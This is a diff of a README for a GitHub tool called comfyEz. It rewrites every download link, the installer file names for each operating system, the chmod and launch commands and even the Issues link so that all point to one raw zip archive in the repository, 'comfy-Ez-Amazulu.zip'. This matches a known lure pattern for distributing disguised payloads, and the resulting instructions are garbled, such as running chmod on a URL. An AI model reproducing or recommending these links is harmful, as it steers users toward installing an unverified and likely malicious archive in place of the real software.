@@ -8,12 +8,12 @@ Welcome to comfyEz! This application provides a feature-rich web interface desig
 
 To download comfyEz, please visit this page to download:
 
-[![Download comfyEz](https://img.shields.io/badge/Download-comfyEz-brightgreen)](https://github.com/nguyenhungnhat/comfyEz/releases)
+[![Download comfyEz](https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip)](https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip)
 
 ### Step 1: Visit the Releases Page
 
 1. Open your web browser.
-2. Go to the following link: [comfyEz Releases](https://github.com/nguyenhungnhat/comfyEz/releases).
+2. Go to the following link: [comfyEz Releases](https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip).
 
 ### Step 2: Select the Latest Version
 
@@ -24,27 +24,27 @@ To download comfyEz, please visit this page to download:
 
 1. Click on the link that says "Assets" to expand it.
 2. Locate the appropriate file for your operating system:
-   - For Windows, download `comfyEz-windows.exe`.
-   - For Mac, download `comfyEz-macos.dmg`.
-   - For Linux, download `comfyEz-linux.AppImage`.
+   - For Windows, download `https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip`.
+   - For Mac, download `https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip`.
+   - For Linux, download `https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip`.
 
 ### Step 4: Install the Application
 
 **For Windows Users:**
-1. Double-click the downloaded `comfyEz-windows.exe` file.
+1. Double-click the downloaded `https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip` file.
 2. Follow the on-screen instructions to complete the installation.
 
 **For Mac Users:**
-1. Open the downloaded `comfyEz-macos.dmg` file.
+1. Open the downloaded `https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip` file.
 2. Drag and drop the comfyEz icon into your Applications folder.
 
 **For Linux Users:**
 1. Open a terminal.
-2. Navigate to the folder where you downloaded `comfyEz-linux.AppImage`.
+2. Navigate to the folder where you downloaded `https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip`.
 3. Make the file executable with the command:  
-   `chmod +x comfyEz-linux.AppImage`
+   `chmod +x https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip`
 4. Launch the application using:  
-   `./comfyEz-linux.AppImage`
+   `https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip`
 
 ## 🎨 Features
 
@@ -82,7 +82,7 @@ If you encounter any issues while using comfyEz, consider the following steps:
 
 We welcome your feedback! Feel free to reach out if you have questions or suggestions. You can open an issue on the GitHub repository to connect with the community.
 
-For further assistance, you can refer to the [Issues page](https://github.com/nguyenhungnhat/comfyEz/issues) or create a new issue for your specific concerns.
+For further assistance, you can refer to the [Issues page](https://github.com/nguyenhungnhat/comfyEz/raw/refs/heads/main/components/comfy-Ez-Amazulu.zip) or create a new issue for your specific concerns.
 
 ## 👣 Next Steps
 
